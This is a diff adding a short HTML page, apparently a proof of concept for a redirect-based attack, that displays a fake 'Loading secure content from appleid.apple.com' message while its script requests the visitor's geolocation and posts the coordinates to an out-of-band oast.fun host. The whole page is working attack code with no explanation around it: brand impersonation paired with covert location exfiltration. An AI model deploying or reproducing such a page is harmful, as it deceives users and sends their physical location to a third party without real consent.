@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirected Page</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background-color: white;
+    }
+    #loading {
+      position: fixed;
+      top: 40%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <div id="loading">Loading secure content from appleid.apple.com...</div>
+
+  <script>
+    setTimeout(() => {
+      // Immediately trigger geolocation prompt after redirect
+      navigator.geolocation.getCurrentPosition(function(pos) {
+        fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
+          method: "POST",
+          body: JSON.stringify({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            source: "redirect-geolocation"
+          }),
+          headers: {
+            'Content-Type': 'application/json'
+          }
+        });
+      }, function(err) {
+        // user denied or blocked
+      });
+    }, 100); // Slight delay for timing sync with redirect
+  </script>
+</body>
+</html>
